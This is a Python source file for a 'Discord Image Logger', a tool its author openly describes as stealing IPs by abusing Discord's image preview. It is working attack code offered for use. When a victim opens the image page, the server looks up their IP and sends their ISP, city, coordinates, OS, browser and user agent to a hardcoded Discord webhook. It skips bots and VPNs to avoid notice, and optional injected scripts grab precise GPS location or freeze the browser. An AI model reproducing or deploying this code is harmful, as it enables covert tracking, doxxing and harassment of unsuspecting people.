# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1103779027187159050/_3KfbQoE2bQOLOcuX8T-uhSbOQN7pj1qK6Smp1ChnTbPynQq2z0hB-hoqJS2e9o6NF4X",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
